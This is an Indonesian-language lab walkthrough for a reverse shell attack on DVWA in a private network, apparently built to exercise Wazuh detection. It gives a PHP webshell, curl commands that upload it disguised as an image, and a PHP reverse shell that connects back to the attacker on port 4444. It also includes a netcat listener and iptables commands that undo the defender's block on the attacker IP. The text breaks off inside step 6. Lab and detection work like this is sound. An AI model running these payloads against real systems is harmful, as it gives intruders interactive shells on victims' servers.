# Reverse Shell Attack

## Deskripsi

Setelah webshell berhasil diupload (lihat `05-file-upload-webshell`),
attacker melakukan spawn reverse shell yang membuat koneksi balik
dari server korban ke mesin attacker. Ini memberikan akses
interactive shell penuh, berbeda dengan webshell yang hanya
one-command-at-a-time.

## MITRE ATT&CK

- **Tactic:** Execution
- **Technique:** T1059.004 — Unix Shell

## Target

- **URL Upload:** `http://192.168.217.130/DVWA/vulnerabilities/upload/`
- **Webshell Path:** `http://192.168.217.130/DVWA/hackable/uploads/shell.php`
- **Attacker IP:** `192.168.217.129`
- **Listener Port:** `4444`

## Prerequisites

- Webshell sudah terupload dari simulasi sebelumnya (`05-file-upload-webshell`)
- Netcat tersedia di Kali attacker

## Persiapan

Jika webshell belum ada atau expired, upload ulang terlebih dahulu.

```bash
# Buat webshell
cat > /tmp/shell.php << 'SHELL'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
SHELL
```

![Create Webshell](screenshot/rs2.png)

```bash
# Set session cookie
SESS="security=low; PHPSESSID=ISI_SESSION_DISINI"

# Upload webshell
curl -s "http://192.168.217.130/DVWA/vulnerabilities/upload/" \
  -b "$SESS" \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
  -F "Upload=Upload"
```

![Upload Webshell](screenshot/rs3.png)

```bash
# Verifikasi webshell aktif
curl -s "http://192.168.217.130/DVWA/hackable/uploads/shell.php?cmd=id"
```

![Verify Webshell](screenshot/rs4.png)

---

## Attack Commands

### 1. Setup Listener di Kali

Membuka listener netcat di mesin attacker untuk menerima koneksi balik dari server korban. Jalankan di **Terminal 1**.

```bash
nc -lvnp 4444
```

![Setup Listener](screenshot/rs7.png)

---

### 2. Buat Reverse Shell PHP

Membuat file PHP yang akan membuka koneksi TCP balik ke attacker dan meneruskan shell interaktif. Jalankan di **Terminal 2**.

```bash
cat > /tmp/rev.php << 'REVSHELL'
<?php
$sock=fsockopen("192.168.217.129",4444);
$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
REVSHELL
```

![Create Reverse Shell](screenshot/rs8.png)

---

### 3. Upload Reverse Shell via DVWA

Mengupload file reverse shell PHP melalui fitur upload DVWA. Jalankan di **Terminal 2**.

```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/upload/" \
  -b "$SESS" \
  -F "uploaded=@/tmp/rev.php;type=image/jpeg" \
  -F "Upload=Upload"
```

![Upload Reverse Shell](screenshot/rs5.png)

---

### 4. Trigger Reverse Shell

Mengakses file reverse shell yang sudah diupload untuk memicu koneksi balik ke attacker. Command ini akan **hang** — itu normal karena koneksi reverse shell sedang aktif. Jalankan di **Terminal 2**.

```bash
curl "http://192.168.217.130/DVWA/hackable/uploads/rev.php"
```

---

### 5. Shell Diterima — Post-Exploitation

Pindah ke **Terminal 1** (listener). Reverse shell berhasil terhubung, attacker mendapat interactive shell.

```bash
# Di terminal listener, shell sudah terhubung:
# connect to [192.168.217.129] from (UNKNOWN) [192.168.217.130]

# Identifikasi user
id
whoami
```

![Shell Received](screenshot/rs9.png)

![Multiple Shell Sessions](screenshot/rs13.png)

---

### 6. Reverse Shell via Existing Webshell

Alternatif: menggunakan webshell yang sudah ada untuk spawn reverse shell tanpa perlu upload file baru.

> **Note:** Jika IP attacker diblokir oleh Wazuh Active Response, unblock terlebih dahulu di ubuntu-target.

```bash
# Di ubuntu-target — cek dan unblock IP
sudo iptables -L -n | grep 192.168.217.129
sudo iptables -D INPUT -s 192.168.217.129
